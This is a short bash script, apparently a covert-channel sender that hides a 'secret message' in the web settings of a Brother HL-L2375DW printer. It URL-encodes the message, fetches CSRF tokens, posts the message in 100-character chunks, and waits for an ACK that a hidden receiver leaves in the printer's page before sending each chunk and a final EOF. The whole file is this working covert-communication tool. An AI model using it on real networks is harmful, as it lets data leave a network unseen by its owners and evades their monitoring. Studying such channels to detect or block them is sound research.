#!/bin/bash
# Brother HL-L2375DW series
PRINTER_IP="192.168.2.103"
if [ "$1" != "" ]; then
	INPUT_SECRET_MSG=$1
else
	INPUT_SECRET_MSG="KATZE"
fi

source brother_shared.sh

# 1. transfer string into url format
INPUT_SECRET_MSG=`urlencode $INPUT_SECRET_MSG`
#echo "INPUT_SECRET_MSG=$INPUT_SECRET_MSG"
#read go
# 2. split into chunks of the max. possible string length (100 characters)
echo "Sending chunks of the secret msg ..."
for SECRET_MSG in `echo $INPUT_SECRET_MSG | fold -w100`; do
	#echo "Next chunk='"$SECRET_MSG"'."
	RECV_MSG="notset"
	#echo "Waiting for CR's ACK msg ..."
	while [ ! "$RECV_MSG" == "$ACK_MESSAGE" ]; do
		CSRF=$(get_csrf_token)
		RECV_MSG=`cat /tmp/tmp_$$ | tail -1 | sed 's/\"\ \/><\/dd><\/dl><\/div><di.*//' | sed 's/.*value=\"//g'`
		echo -n "#"
	done; echo -n "K" #echo " received 'ACK'. Sending secret msg chunk."

	# parameters: printer-ip  csrf  secret_msg
	post_message $PRINTER_IP $CSRF $SECRET_MSG
	echo -n "#"
done
echo -n "sending EOF: "
CSRF=$(get_csrf_token)
post_message $PRINTER_IP $CSRF "EOF"
echo "done."

